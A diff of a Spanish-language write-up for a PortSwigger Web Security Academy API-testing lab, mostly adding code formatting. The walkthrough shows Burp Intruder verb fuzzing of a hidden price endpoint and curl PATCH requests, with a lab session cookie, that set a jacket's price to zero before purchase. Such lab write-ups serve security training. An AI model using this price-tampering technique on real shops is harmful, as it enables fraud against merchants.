@@ -24,25 +24,25 @@ image:
   
 ## Descripción
 
-Para resolver el laboratorio, debemos explotar un endpoint oculto de la API para comprar una Lightweight l33t Leather Jacket. Podemos iniciar sesión en nuestra propia cuenta utilizando las credenciales wiener:peter
+Para `resolver` el laboratorio, debemos explotar un `endpoint oculto de la API` para comprar una `Lightweight l33t Leather Jacket`. Podemos `iniciar sesión` en nuestra propia cuenta utilizando las credenciales `wiener:peter`
 
 ---
 
 ## Resolución
 
-Al acceder a la web nos sale esto
+Al `acceder` a la `web` nos sale esto
 
 ![](/assets/img/API-Testing-Lab-3/image_1.png)
 
-Pulsamos sobre My account y nos logueamos utilizando las credenciales wiener:peter
+Pulsamos sobre `My account` y nos `logueamos` utilizando las credenciales `wiener:peter`
 
 ![](/assets/img/API-Testing-Lab-3/image_2.png)
 
-Si nos abrimos el código fuente de la web nos encontramos estos
+Si nos `abrimos` el `código fuente` de la `web` nos encontramos estos
 
 ![](/assets/img/API-Testing-Lab-3/image_3.png)
 
-Si accedemos a https://0a05009004d6f6e6801453ce00a2008e.web-security-academy.net/resources/js/api/productPrice.js vemos este contenido
+Si accedemos a `https://0a05009004d6f6e6801453ce00a2008e.web-security-academy.net/resources/js/api/productPrice.js` vemos este contenido
 
 ```
 const Container = class {
@@ -98,7 +98,7 @@ const showProductMessage = (target, message) => {
 
 const handleResponse = (target) => (response) => {
     if (response.error) {
-        showErrorMessage(target, Failed to get price: ${response.type}: ${response.error} (${response.code}));
+        showErrorMessage(target, `Failed to get price: ${response.type}: ${response.error} (${response.code})`);
     } else {
         setPrice(response.price);
         if (response.message) {
@@ -109,7 +109,7 @@ const handleResponse = (target) => (response) => {
 
 const loadPricing = (productId) => {
     const url = new URL(location);
-    fetch(//${url.host}/api/products/${encodeURIComponent(productId)}/price)
+    fetch(`//${url.host}/api/products/${encodeURIComponent(productId)}/price`)
         .then(res => res.json())
         .then(handleResponse(getAddToCartForm()));
 };
@@ -123,45 +123,45 @@ window.onload = () => {
 };
 ```
 
-Pulsamos sobre View details > Add to cart para añadir un producto a nuestro carrito
+Pulsamos sobre `View details > Add to cart` para añadir un producto a nuestro carrito
 
 ![](/assets/img/API-Testing-Lab-3/image_4.png)
 
-Si nos abrimos Burpsuite y nos dirigimos a la extensión Logger ++ vemos que al añadir un producto al carrito se hace una petición a /api/products/1/price
+Si nos abrimos `Burpsuite` y nos dirigimos a la extensión `Logger ++` vemos que al `añadir` un `producto` al `carrito` se hace una petición a `/api/products/1/price`
 
 ![](/assets/img/API-Testing-Lab-3/image_5.png)
 
-Mandamos la petición al Intruder y marcamos GET
+`Mandamos` la `petición` al `Intruder` y marcamos `GET`
 
 ![](/assets/img/API-Testing-Lab-3/image_6.png)
 
-Añadimos el payload llamado HTTP verbs
+`Añadimos` el `payload` llamado `HTTP verbs`
 
 ![](/assets/img/API-Testing-Lab-3/image_7.png)
 
-Inspeccionamos las respuestas recibidas y vemos un código de estado 400 con esta respuesta
+`Inspeccionamos` las `respuestas` recibidas y vemos un `código de estado 400` con esta `respuesta`
 
 ![](/assets/img/API-Testing-Lab-3/image_8.png)
 
-Enviamos esta petición y nos responde que nos falta un parámetro en el body
+`Enviamos` esta `petición` y nos responde que nos falta un `parámetro` en el `body`
 
 ```
 # curl -X PATCH -s --cookie 'session=FAsAkXfF7a0bDzIPfF7Pwtsf7xTczZUQ' -H 'Content-Type: application/json' https://0a05009004d6f6e6801453ce00a2008e.web-security-academy.net/api/products/1/price --data '{}'          
 {"type":"ClientError","code":400,"error":"'price' parameter missing in body"}  
 ```
 
-Modificamos el precio del artículo aparentemente
+`Modificamos` el `precio` del `artículo` aparentemente
 
 ```
 # curl -X PATCH -s --cookie 'session=FAsAkXfF7a0bDzIPfF7Pwtsf7xTczZUQ' -H 'Content-Type: application/json' https://0a05009004d6f6e6801453ce00a2008e.web-security-academy.net/api/products/1/price --data '{"price":0}'         
 {"price":"$0.00"} 
 ```
 
-Si nos dirigimos a la web podemos confirmarlo
+Si nos `dirigimos` a la `web` podemos confirmarlo
 
 ![](/assets/img/API-Testing-Lab-3/image_9.png)
 
-Pulsamos sobre Place Order y compramos el artículo
+`Pulsamos` sobre `Place Order` y `compramos` el `artículo`
 
 ![](/assets/img/API-Testing-Lab-3/image_10.png)
 
